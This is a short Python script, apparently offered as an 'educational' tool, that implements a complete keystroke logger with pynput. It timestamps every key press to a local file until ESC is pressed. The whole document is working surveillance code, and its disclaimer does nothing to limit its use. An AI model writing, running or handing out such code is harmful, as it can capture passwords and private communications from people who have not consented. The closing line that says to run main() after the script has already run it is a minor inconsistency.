from pynput import keyboard
import time
from datetime import datetime
import os

class SimpleKeylogger:
    def __init__(self, filename: str = "keylog.txt"):
        self.filename = filename
        self.start_time = datetime.now()
        
    def get_char(self, key):
        try:
            # Normal key press
            return key.char
        except AttributeError:
            # Special key press
            return str(key)

    def on_press(self, key):
        try:
            # Get the current time
            timestamp = datetime.now()
            
            # Convert key to string
            key_char = self.get_char(key)
            
            # Format the log entry
            log_entry = f"[{timestamp}] Key: {key_char}\n"
            
            # Write to file
            with open(self.filename, 'a') as f:
                f.write(log_entry)
                
        except Exception as e:
            print(f"Error logging key: {str(e)}")

    def on_release(self, key):
        # Stop listener on ESC
        if key == keyboard.Key.esc:
            return False

    def start(self):
        # Create header in log file
        with open(self.filename, 'a') as f:
            f.write(f"\n{'='*50}\n")
            f.write(f"Keylogger Started at: {self.start_time}\n")
            f.write(f"{'='*50}\n")

        print(f"[*] Keylogger started. Logging to: {self.filename}")
        print("[*] Press ESC to stop logging")
        
        # Start the listener
        with keyboard.Listener(
            on_press=self.on_press,
            on_release=self.on_release) as listener:
            listener.join()
            
        # Log the end time
        end_time = datetime.now()
        with open(self.filename, 'a') as f:
            f.write(f"\n{'='*50}\n")
            f.write(f"Keylogger Stopped at: {end_time}\n")
            f.write(f"Duration: {end_time - self.start_time}\n")
            f.write(f"{'='*50}\n")
            
        print(f"[*] Keylogger stopped. Duration: {end_time - self.start_time}")

def main():
    print("=== Educational Keylogger ===")
    print("\nWARNING: This tool is for educational purposes only.")
    print("Using keyloggers without consent is illegal.")
    
    # Get filename from user
    filename = input("\nEnter log filename (default: keylog.txt): ").strip()
    if not filename:
        filename = "keylog.txt"
    
    # Create keylogger instance
    keylogger = SimpleKeylogger(filename)
    
    # Start logging
    print("\nStarting keylogger...")
    keylogger.start()

if __name__ == "__main__":
    main()

# Show the code has been loaded
print("Keylogger code ready to run. Execute 'main()' to start.")